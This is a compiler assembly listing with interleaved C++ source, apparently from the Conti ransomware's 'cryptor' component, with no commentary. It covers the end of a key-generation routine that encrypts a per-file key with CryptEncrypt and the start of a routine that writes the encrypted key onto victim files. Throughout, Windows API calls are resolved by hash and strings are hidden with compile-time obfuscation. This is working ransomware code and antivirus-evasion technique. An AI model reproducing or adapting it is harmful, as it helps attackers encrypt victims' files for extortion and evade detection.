  0038a	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$1[rbp-88]
  0038d	f7 e9		 imul	 ecx
  0038f	8b c2		 mov	 eax, edx
  00391	c1 e8 1f	 shr	 eax, 31
  00394	03 d0		 add	 edx, eax
  00396	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00399	3b c8		 cmp	 ecx, eax
  0039b	74 42		 je	 SHORT $LN112@GenKey

; 49   : 		_morph_var += (int)a + 2;

  0039d	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$1[rbp-88]
  003a0	41 03 cc	 add	 ecx, r12d
  003a3	03 cf		 add	 ecx, edi
  003a5	89 4d e8	 mov	 DWORD PTR _morph_var$1[rbp-88], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  003a8	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$1[rbp-88]
  003ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003b0	7d 07		 jge	 SHORT $LN207@GenKey
  003b2	ff c8		 dec	 eax
  003b4	83 c8 fc	 or	 eax, -4
  003b7	ff c0		 inc	 eax
$LN207@GenKey:
  003b9	85 c0		 test	 eax, eax
  003bb	75 73		 jne	 SHORT $LN111@GenKey
  003bd	0f 1f 00	 npad	 3
$LL104@GenKey:
  003c0	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$1[rbp-88]
  003c3	ff c0		 inc	 eax
  003c5	89 45 e8	 mov	 DWORD PTR _morph_var$1[rbp-88], eax
  003c8	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$1[rbp-88]
  003cb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003d0	7d 07		 jge	 SHORT $LN206@GenKey
  003d2	ff c8		 dec	 eax
  003d4	83 c8 fc	 or	 eax, -4
  003d7	ff c0		 inc	 eax
$LN206@GenKey:
  003d9	85 c0		 test	 eax, eax
  003db	74 e3		 je	 SHORT $LL104@GenKey

; 51   : 	}

  003dd	eb 51		 jmp	 SHORT $LN111@GenKey
$LN112@GenKey:

; 52   : 	else if (_morph_var % 2) {

  003df	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$1[rbp-88]

; 53   : 		_morph_var -= (int)a - 2;

  003e2	44 2b e7	 sub	 r12d, edi
  003e5	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$1[rbp-88]
  003e8	44 03 e0	 add	 r12d, eax
  003eb	44 89 65 e8	 mov	 DWORD PTR _morph_var$1[rbp-88], r12d

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  003ef	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003f4	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$1[rbp-88]
  003f7	f7 e9		 imul	 ecx
  003f9	8b c2		 mov	 eax, edx
  003fb	c1 e8 1f	 shr	 eax, 31
  003fe	03 d0		 add	 edx, eax
  00400	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00403	3b c8		 cmp	 ecx, eax
  00405	75 29		 jne	 SHORT $LN111@GenKey
  00407	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL106@GenKey:
  00410	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$1[rbp-88]
  00413	ff c0		 inc	 eax
  00415	89 45 e8	 mov	 DWORD PTR _morph_var$1[rbp-88], eax
  00418	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0041d	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$1[rbp-88]
  00420	f7 e9		 imul	 ecx
  00422	8b c2		 mov	 eax, edx
  00424	c1 e8 1f	 shr	 eax, 31
  00427	03 d0		 add	 edx, eax
  00429	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0042c	3b c8		 cmp	 ecx, eax
  0042e	74 e0		 je	 SHORT $LL106@GenKey
$LN111@GenKey:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 626  : 	pFunction = (BOOL(WINAPI*)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xd3bb19e6, 54);//GetProcAddress(hAdvapi32, OBFA("CryptEncrypt"));

  00430	ba 10 00 00 00	 mov	 edx, 16
  00435	41 b8 e6 19 bb
	d3		 mov	 r8d, -742712858		; d3bb19e6H
  0043b	44 8d 4a 26	 lea	 r9d, QWORD PTR [rdx+38]
  0043f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 627  : 	return pFunction(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);

  00444	45 33 c9	 xor	 r9d, r9d
  00447	c7 44 24 30 0c
	02 00 00	 mov	 DWORD PTR [rsp+48], 524	; 0000020cH
  0044f	48 8d 4d ec	 lea	 rcx, QWORD PTR dwDataLen$[rbp-88]
  00453	33 d2		 xor	 edx, edx
  00455	48 89 4c 24 28	 mov	 QWORD PTR [rsp+40], rcx
  0045a	49 8b cd	 mov	 rcx, r13
  0045d	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  00462	45 8d 41 01	 lea	 r8d, QWORD PTR [r9+1]
  00466	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 721  : 	if (!pCryptEncrypt(PublicKey, 0, TRUE, 0, FileInfo->EncryptedKey, &dwDataLen, 524)) {

  00468	85 c0		 test	 eax, eax
  0046a	41 0f 95 c6	 setne	 r14b
  0046e	41 8b c6	 mov	 eax, r14d
  00471	4c 8b 74 24 50	 mov	 r14, QWORD PTR [rsp+80]
  00476	eb 02		 jmp	 SHORT $LN1@GenKey
$LN202@GenKey:

; 722  : 		return FALSE;

  00478	33 c0		 xor	 eax, eax
$LN1@GenKey:
  0047a	48 8b b4 24 a8
	00 00 00	 mov	 rsi, QWORD PTR [rsp+168]

; 723  : 	}
; 724  : 
; 725  : 	return TRUE;
; 726  : }

  00482	48 8b 4d f0	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-88]
  00486	48 33 cc	 xor	 rcx, rsp
  00489	e8 00 00 00 00	 call	 __security_check_cookie
  0048e	48 83 c4 58	 add	 rsp, 88			; 00000058H
  00492	41 5f		 pop	 r15
  00494	41 5d		 pop	 r13
  00496	41 5c		 pop	 r12
  00498	5f		 pop	 rdi
  00499	5b		 pop	 rbx
  0049a	5d		 pop	 rbp
  0049b	c3		 ret	 0
?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z ENDP		; GenKey
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z
_TEXT	SEGMENT
$T2 = 32
$T4 = 144
$T6 = 256
$T8 = 368
Buffer$ = 480
__$ArrayPad$ = 496
FileInfo$ = 528
EncryptMode$ = 536
DataPercent$ = 544
?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z PROC	; WriteEncryptInfo, COMDAT

; 782  : {

$LN887:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000a	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  0000f	55		 push	 rbp
  00010	48 8d ac 24 00
	ff ff ff	 lea	 rbp, QWORD PTR [rsp-256]
  00018	48 81 ec 00 02
	00 00		 sub	 rsp, 512		; 00000200H
  0001f	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00026	48 33 c4	 xor	 rax, rsp
  00029	48 89 85 f0 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 791  : 	if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_END)) {

  00030	48 8b 59 08	 mov	 rbx, QWORD PTR [rcx+8]
  00034	33 ff		 xor	 edi, edi
  00036	88 95 e0 00 00
	00		 mov	 BYTE PTR Buffer$[rbp-256], dl
  0003c	48 8b f1	 mov	 rsi, rcx
  0003f	44 88 85 e1 00
	00 00		 mov	 BYTE PTR Buffer$[rbp-255], r8b
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  00046	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 29   : 		*(size_t*)_dst = *(size_t*)_src;

  0004c	48 8b 41 10	 mov	 rax, QWORD PTR [rcx+16]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  00050	8d 57 0f	 lea	 edx, QWORD PTR [rdi+15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 29   : 		*(size_t*)_dst = *(size_t*)_src;

  00053	48 89 85 e2 00
	00 00		 mov	 QWORD PTR Buffer$[rbp-254], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  0005a	44 8d 4f 59	 lea	 r9d, QWORD PTR [rdi+89]
  0005e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  00063	44 8d 4f 02	 lea	 r9d, QWORD PTR [rdi+2]
  00067	45 33 c0	 xor	 r8d, r8d
  0006a	8b d7		 mov	 edx, edi
  0006c	48 8b cb	 mov	 rcx, rbx
  0006f	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 791  : 	if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_END)) {

  00071	85 c0		 test	 eax, eax
  00073	0f 85 74 02 00
	00		 jne	 $LN2@WriteEncry
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  00079	8d 57 0f	 lea	 edx, QWORD PTR [rdi+15]
  0007c	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00082	44 8d 4f 5d	 lea	 r9d, QWORD PTR [rdi+93]
  00086	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  0008b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0008d	40 88 7c 24 20	 mov	 BYTE PTR $T2[rsp], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  00092	44 8b c8	 mov	 r9d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00095	c6 44 24 21 7d	 mov	 BYTE PTR $T2[rsp+1], 125 ; 0000007dH
  0009a	c6 44 24 22 67	 mov	 BYTE PTR $T2[rsp+2], 103 ; 00000067H
  0009f	c6 44 24 23 72	 mov	 BYTE PTR $T2[rsp+3], 114 ; 00000072H
  000a4	c6 44 24 24 67	 mov	 BYTE PTR $T2[rsp+4], 103 ; 00000067H
  000a9	c6 44 24 25 69	 mov	 BYTE PTR $T2[rsp+5], 105 ; 00000069H
  000ae	c6 44 24 26 67	 mov	 BYTE PTR $T2[rsp+6], 103 ; 00000067H
  000b3	c6 44 24 27 4c	 mov	 BYTE PTR $T2[rsp+7], 76	; 0000004cH
  000b8	c6 44 24 28 67	 mov	 BYTE PTR $T2[rsp+8], 103 ; 00000067H
  000bd	c6 44 24 29 34	 mov	 BYTE PTR $T2[rsp+9], 52	; 00000034H
  000c2	c6 44 24 2a 67	 mov	 BYTE PTR $T2[rsp+10], 103 ; 00000067H
  000c7	c6 44 24 2b 20	 mov	 BYTE PTR $T2[rsp+11], 32 ; 00000020H
  000cc	c6 44 24 2c 67	 mov	 BYTE PTR $T2[rsp+12], 103 ; 00000067H
  000d1	c6 44 24 2d 59	 mov	 BYTE PTR $T2[rsp+13], 89 ; 00000059H
  000d6	c6 44 24 2e 67	 mov	 BYTE PTR $T2[rsp+14], 103 ; 00000067H
  000db	c6 44 24 2f 70	 mov	 BYTE PTR $T2[rsp+15], 112 ; 00000070H
  000e0	c6 44 24 30 67	 mov	 BYTE PTR $T2[rsp+16], 103 ; 00000067H
  000e5	c6 44 24 31 01	 mov	 BYTE PTR $T2[rsp+17], 1
  000ea	c6 44 24 32 67	 mov	 BYTE PTR $T2[rsp+18], 103 ; 00000067H
  000ef	c6 44 24 33 34	 mov	 BYTE PTR $T2[rsp+19], 52 ; 00000034H
  000f4	c6 44 24 34 67	 mov	 BYTE PTR $T2[rsp+20], 103 ; 00000067H
  000f9	c6 44 24 35 79	 mov	 BYTE PTR $T2[rsp+21], 121 ; 00000079H
  000fe	c6 44 24 36 67	 mov	 BYTE PTR $T2[rsp+22], 103 ; 00000067H
  00103	c6 44 24 37 20	 mov	 BYTE PTR $T2[rsp+23], 32 ; 00000020H
  00108	c6 44 24 38 67	 mov	 BYTE PTR $T2[rsp+24], 103 ; 00000067H
  0010d	c6 44 24 39 44	 mov	 BYTE PTR $T2[rsp+25], 68 ; 00000044H
  00112	c6 44 24 3a 67	 mov	 BYTE PTR $T2[rsp+26], 103 ; 00000067H
  00117	c6 44 24 3b 79	 mov	 BYTE PTR $T2[rsp+27], 121 ; 00000079H
  0011c	c6 44 24 3c 67	 mov	 BYTE PTR $T2[rsp+28], 103 ; 00000067H
  00121	c6 44 24 3d 1d	 mov	 BYTE PTR $T2[rsp+29], 29
  00126	c6 44 24 3e 67	 mov	 BYTE PTR $T2[rsp+30], 103 ; 00000067H
  0012b	c6 44 24 3f 20	 mov	 BYTE PTR $T2[rsp+31], 32 ; 00000020H
  00130	c6 44 24 40 67	 mov	 BYTE PTR $T2[rsp+32], 103 ; 00000067H
  00135	c6 44 24 41 5b	 mov	 BYTE PTR $T2[rsp+33], 91 ; 0000005bH
  0013a	c6 44 24 42 67	 mov	 BYTE PTR $T2[rsp+34], 103 ; 00000067H
  0013f	c6 44 24 43 4b	 mov	 BYTE PTR $T2[rsp+35], 75 ; 0000004bH
  00144	c6 44 24 44 67	 mov	 BYTE PTR $T2[rsp+36], 103 ; 00000067H
  00149	c6 44 24 45 70	 mov	 BYTE PTR $T2[rsp+37], 112 ; 00000070H
  0014e	c6 44 24 46 67	 mov	 BYTE PTR $T2[rsp+38], 103 ; 00000067H
  00153	c6 44 24 47 20	 mov	 BYTE PTR $T2[rsp+39], 32 ; 00000020H
  00158	c6 44 24 48 67	 mov	 BYTE PTR $T2[rsp+40], 103 ; 00000067H
  0015d	c6 44 24 49 5b	 mov	 BYTE PTR $T2[rsp+41], 91 ; 0000005bH
  00162	c6 44 24 4a 67	 mov	 BYTE PTR $T2[rsp+42], 103 ; 00000067H
  00167	c6 44 24 4b 01	 mov	 BYTE PTR $T2[rsp+43], 1
  0016c	c6 44 24 4c 67	 mov	 BYTE PTR $T2[rsp+44], 103 ; 00000067H
  00171	c6 44 24 4d 26	 mov	 BYTE PTR $T2[rsp+45], 38 ; 00000026H
  00176	c6 44 24 4e 67	 mov	 BYTE PTR $T2[rsp+46], 103 ; 00000067H
  0017b	c6 44 24 4f 79	 mov	 BYTE PTR $T2[rsp+47], 121 ; 00000079H
  00180	c6 44 24 50 67	 mov	 BYTE PTR $T2[rsp+48], 103 ; 00000067H
  00185	c6 44 24 51 20	 mov	 BYTE PTR $T2[rsp+49], 32 ; 00000020H
  0018a	c6 44 24 52 67	 mov	 BYTE PTR $T2[rsp+50], 103 ; 00000067H
  0018f	c6 44 24 53 09	 mov	 BYTE PTR $T2[rsp+51], 9
  00194	c6 44 24 54 67	 mov	 BYTE PTR $T2[rsp+52], 103 ; 00000067H
  00199	c6 44 24 55 52	 mov	 BYTE PTR $T2[rsp+53], 82 ; 00000052H
  0019e	c6 44 24 56 67	 mov	 BYTE PTR $T2[rsp+54], 103 ; 00000067H
  001a3	c6 44 24 57 78	 mov	 BYTE PTR $T2[rsp+55], 120 ; 00000078H
  001a8	c6 44 24 58 67	 mov	 BYTE PTR $T2[rsp+56], 103 ; 00000067H
  001ad	c6 44 24 59 20	 mov	 BYTE PTR $T2[rsp+57], 32 ; 00000020H
  001b2	c6 44 24 5a 67	 mov	 BYTE PTR $T2[rsp+58], 103 ; 00000067H
  001b7	c6 44 24 5b 05	 mov	 BYTE PTR $T2[rsp+59], 5
  001bc	c6 44 24 5c 67	 mov	 BYTE PTR $T2[rsp+60], 103 ; 00000067H
  001c1	c6 44 24 5d 79	 mov	 BYTE PTR $T2[rsp+61], 121 ; 00000079H
  001c6	c6 44 24 5e 67	 mov	 BYTE PTR $T2[rsp+62], 103 ; 00000067H
  001cb	c6 44 24 5f 34	 mov	 BYTE PTR $T2[rsp+63], 52 ; 00000034H
  001d0	c6 44 24 60 67	 mov	 BYTE PTR $T2[rsp+64], 103 ; 00000067H
  001d5	c6 44 24 61 6d	 mov	 BYTE PTR $T2[rsp+65], 109 ; 0000006dH
  001da	c6 44 24 62 67	 mov	 BYTE PTR $T2[rsp+66], 103 ; 00000067H
  001df	c6 44 24 63 72	 mov	 BYTE PTR $T2[rsp+67], 114 ; 00000072H
  001e4	c6 44 24 64 67	 mov	 BYTE PTR $T2[rsp+68], 103 ; 00000067H
  001e9	c6 44 24 65 52	 mov	 BYTE PTR $T2[rsp+69], 82 ; 00000052H
  001ee	c6 44 24 66 67	 mov	 BYTE PTR $T2[rsp+70], 103 ; 00000067H
  001f3	c6 44 24 67 34	 mov	 BYTE PTR $T2[rsp+71], 52 ; 00000034H
  001f8	c6 44 24 68 67	 mov	 BYTE PTR $T2[rsp+72], 103 ; 00000067H
  001fd	c6 44 24 69 41	 mov	 BYTE PTR $T2[rsp+73], 65 ; 00000041H
  00202	c6 44 24 6a 67	 mov	 BYTE PTR $T2[rsp+74], 103 ; 00000067H
  00207	c6 44 24 6b 70	 mov	 BYTE PTR $T2[rsp+75], 112 ; 00000070H
  0020c	c6 44 24 6c 67	 mov	 BYTE PTR $T2[rsp+76], 103 ; 00000067H
  00211	c6 44 24 6d 70	 mov	 BYTE PTR $T2[rsp+77], 112 ; 00000070H
  00216	c6 44 24 6e 67	 mov	 BYTE PTR $T2[rsp+78], 103 ; 00000067H
  0021b	c6 44 24 6f 4b	 mov	 BYTE PTR $T2[rsp+79], 75 ; 0000004bH
  00220	c6 44 24 70 67	 mov	 BYTE PTR $T2[rsp+80], 103 ; 00000067H
  00225	c6 44 24 71 70	 mov	 BYTE PTR $T2[rsp+81], 112 ; 00000070H
  0022a	c6 44 24 72 67	 mov	 BYTE PTR $T2[rsp+82], 103 ; 00000067H
  0022f	c6 44 24 73 20	 mov	 BYTE PTR $T2[rsp+83], 32 ; 00000020H
  00234	c6 44 24 74 67	 mov	 BYTE PTR $T2[rsp+84], 103 ; 00000067H
  00239	c6 44 24 75 33	 mov	 BYTE PTR $T2[rsp+85], 51 ; 00000033H
  0023e	c6 44 24 76 67	 mov	 BYTE PTR $T2[rsp+86], 103 ; 00000067H
  00243	c6 44 24 77 20	 mov	 BYTE PTR $T2[rsp+87], 32 ; 00000020H
  00248	c6 44 24 78 67	 mov	 BYTE PTR $T2[rsp+88], 103 ; 00000067H
  0024d	c6 44 24 79 09	 mov	 BYTE PTR $T2[rsp+89], 9
  00252	c6 44 24 7a 67	 mov	 BYTE PTR $T2[rsp+90], 103 ; 00000067H
  00257	c6 44 24 7b 26	 mov	 BYTE PTR $T2[rsp+91], 38 ; 00000026H
  0025c	c6 44 24 7c 67	 mov	 BYTE PTR $T2[rsp+92], 103 ; 00000067H
  00261	c6 44 24 7d 16	 mov	 BYTE PTR $T2[rsp+93], 22
  00266	c6 44 24 7e 67	 mov	 BYTE PTR $T2[rsp+94], 103 ; 00000067H
  0026b	c6 44 24 7f 67	 mov	 BYTE PTR $T2[rsp+95], 103 ; 00000067H
  00270	c6 45 80 67	 mov	 BYTE PTR $T2[rbp-160], 103 ; 00000067H
  00274	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00279	0f b6 44 24 20	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  0027e	84 c0		 test	 al, al
  00280	75 54		 jne	 SHORT $LN214@WriteEncry
$LL215@WriteEncry:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00282	0f b6 4c 3c 21	 movzx	 ecx, BYTE PTR $T2[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  00287	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0028c	83 e9 67	 sub	 ecx, 103		; 00000067H
  0028f	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00293	41 f7 e8	 imul	 r8d
  00296	41 03 d0	 add	 edx, r8d
  00299	c1 fa 06	 sar	 edx, 6
  0029c	8b c2		 mov	 eax, edx
  0029e	c1 e8 1f	 shr	 eax, 31
  002a1	03 d0		 add	 edx, eax
  002a3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002a6	44 2b c0	 sub	 r8d, eax
  002a9	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  002ae	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  002b2	41 f7 e8	 imul	 r8d
  002b5	41 03 d0	 add	 edx, r8d
  002b8	c1 fa 06	 sar	 edx, 6
  002bb	8b c2		 mov	 eax, edx
  002bd	c1 e8 1f	 shr	 eax, 31
  002c0	03 d0		 add	 edx, eax
  002c2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002c5	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002c8	44 88 44 3c 21	 mov	 BYTE PTR $T2[rsp+rdi+1], r8b
  002cd	48 ff c7	 inc	 rdi
  002d0	48 83 ff 60	 cmp	 rdi, 96			; 00000060H
  002d4	72 ac		 jb	 SHORT $LL215@WriteEncry
$LN214@WriteEncry:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 793  : 		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  002d6	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  002d9	48 8d 4c 24 21	 lea	 rcx, QWORD PTR $T2[rsp+1]
  002de	45 8b c1	 mov	 r8d, r9d
  002e1	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 794  : 		return FALSE;

  002e6	33 c0		 xor	 eax, eax
  002e8	e9 b0 07 00 00	 jmp	 $LN1@WriteEncry
$LN2@WriteEncry:

; 795  : 
; 796  : 	}
; 797  : 
; 798  : 	Success = WriteFullData(FileInfo->FileHandle, FileInfo->EncryptedKey, 524);

  002ed	48 8b 4e 08	 mov	 rcx, QWORD PTR [rsi+8]
  002f1	48 8d 96 80 00
	00 00		 lea	 rdx, QWORD PTR [rsi+128]
  002f8	41 b8 0c 02 00
	00		 mov	 r8d, 524		; 0000020cH
  002fe	e8 00 00 00 00	 call	 ?WriteFullData@@YAHPEAX0K@Z ; WriteFullData

; 799  : 	if (!Success) {

  00303	85 c0		 test	 eax, eax
  00305	0f 85 19 02 00
	00		 jne	 $LN3@WriteEncry
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  0030b	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  0030e	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00314	44 8d 48 5d	 lea	 r9d, QWORD PTR [rax+93]
  00318	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  0031d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0031f	40 88 7d 90	 mov	 BYTE PTR $T4[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  00323	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00326	c6 45 91 2d	 mov	 BYTE PTR $T4[rbp-255], 45 ; 0000002dH
  0032a	c6 45 92 54	 mov	 BYTE PTR $T4[rbp-254], 84 ; 00000054H
  0032e	c6 45 93 01	 mov	 BYTE PTR $T4[rbp-253], 1
  00332	c6 45 94 54	 mov	 BYTE PTR $T4[rbp-252], 84 ; 00000054H
  00336	c6 45 95 5c	 mov	 BYTE PTR $T4[rbp-251], 92 ; 0000005cH
  0033a	c6 45 96 54	 mov	 BYTE PTR $T4[rbp-250], 84 ; 00000054H
  0033e	c6 45 97 67	 mov	 BYTE PTR $T4[rbp-249], 103 ; 00000067H
  00342	c6 45 98 54	 mov	 BYTE PTR $T4[rbp-248], 84 ; 00000054H
  00346	c6 45 99 07	 mov	 BYTE PTR $T4[rbp-247], 7
  0034a	c6 45 9a 54	 mov	 BYTE PTR $T4[rbp-246], 84 ; 00000054H
  0034e	c6 45 9b 36	 mov	 BYTE PTR $T4[rbp-245], 54 ; 00000036H
  00352	c6 45 9c 54	 mov	 BYTE PTR $T4[rbp-244], 84 ; 00000054H
  00356	c6 45 9d 1c	 mov	 BYTE PTR $T4[rbp-243], 28
  0035a	c6 45 9e 54	 mov	 BYTE PTR $T4[rbp-242], 84 ; 00000054H
  0035e	c6 45 9f 78	 mov	 BYTE PTR $T4[rbp-241], 120 ; 00000078H
  00362	c6 45 a0 54	 mov	 BYTE PTR $T4[rbp-240], 84 ; 00000054H
